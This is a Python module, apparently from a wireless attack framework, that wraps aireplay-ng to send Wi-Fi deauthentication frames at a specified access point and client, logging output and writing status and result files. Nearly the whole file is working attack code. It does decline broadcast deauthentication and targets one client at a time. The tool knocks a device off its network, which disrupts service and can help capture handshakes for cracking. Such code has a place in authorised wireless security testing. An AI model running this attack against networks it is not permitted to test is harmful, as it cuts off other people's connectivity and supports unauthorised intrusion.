"""Deauthentication attack handler using aireplay-ng."""
from __future__ import annotations

import json
import os
import re
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

from _log_util import log, ToolOutputLogger, drain_stdout

STATUS_INTERVAL = 10

IMPORTANT_RE = [
    re.compile(r"DeAuth", re.I),
    re.compile(r"ACK", re.I),
    re.compile(r"Sending", re.I),
]


def _is_stop_requested() -> bool:
    from attack_runner import is_stop_requested
    return is_stop_requested()


def run(config: dict, data_dir: Path) -> None:
    bssid = config["bssid"]
    interface = config["interface"]
    client_mac = config.get("client_mac")
    count = config.get("count", 0)
    timeout = config.get("timeout", 60)

    log_path = data_dir / "log.txt"

    if not client_mac:
        log(log_path, "=== Deauthentication ===")
        log(log_path, "ERROR: no target client - broadcast deauth is disabled to avoid disrupting non-target clients")
        _update_status(data_dir, "failed", "no target client selected")
        result = {"bssid": bssid, "client_mac": None, "error": "no target client selected"}
        (data_dir / "result.json").write_text(json.dumps(result, indent=2))
        raise RuntimeError("no target client selected")

    cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, "-c", client_mac, interface]
    mode = "continuous" if count == 0 else f"{count} frames"

    log(log_path, "=== Deauthentication ===")
    log(log_path, f"bssid:     {bssid}")
    log(log_path, f"target:    {client_mac}")
    log(log_path, f"interface: {interface}")
    log(log_path, f"mode:      {mode}, timeout {timeout}s")
    log(log_path, f"exec: {' '.join(cmd)}")

    _update_status(data_dir, "running", f"deauth {bssid} -> {client_mac}")

    start = time.time()
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    tl = ToolOutputLogger(log_path, prefix="aireplay> ")
    last_status = 0.0
    stopped = False

    try:
        while time.time() - start < timeout:
            if proc.poll() is not None:
                drain_stdout(proc, tl, IMPORTANT_RE)
                log(log_path, f"aireplay-ng exited (code={proc.returncode})")
                break
            if _is_stop_requested():
                stopped = True
                log(log_path, "stop requested")
                proc.terminate()
                break

            drain_stdout(proc, tl, IMPORTANT_RE)

            elapsed = time.time() - start
            if elapsed - last_status >= STATUS_INTERVAL:
                progress = f"deauth ({int(elapsed)}s)"
                if tl.last_status:
                    progress += f" | {tl.last_status[:100]}"
                _update_status(data_dir, "running", progress)
                last_status = elapsed
            time.sleep(0.3)

        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=5)
    except Exception as e:
        log(log_path, f"error: {e}")
        if proc.poll() is None:
            proc.terminate()

    duration = round(time.time() - start, 1)
    log(log_path, f"=== Done: {duration}s, exit={proc.returncode} ===")

    result = {
        "bssid": bssid,
        "client_mac": client_mac,
        "count": count,
        "stopped_early": stopped,
        "duration_s": duration,
        "exit_code": proc.returncode,
    }
    (data_dir / "result.json").write_text(json.dumps(result, indent=2))

    if not stopped and proc.returncode not in (0, None):
        raise RuntimeError(f"aireplay-ng failed with exit code {proc.returncode}")


def _update_status(data_dir: Path, status: str, progress: str) -> None:
    payload = {
        "status": status,
        "progress": progress,
        "started_at": os.environ.get("_RUNNER_STARTED_AT", ""),
        "updated_at": datetime.now(timezone.utc).isoformat(),
    }
    (data_dir / "status.json").write_text(json.dumps(payload, indent=2))
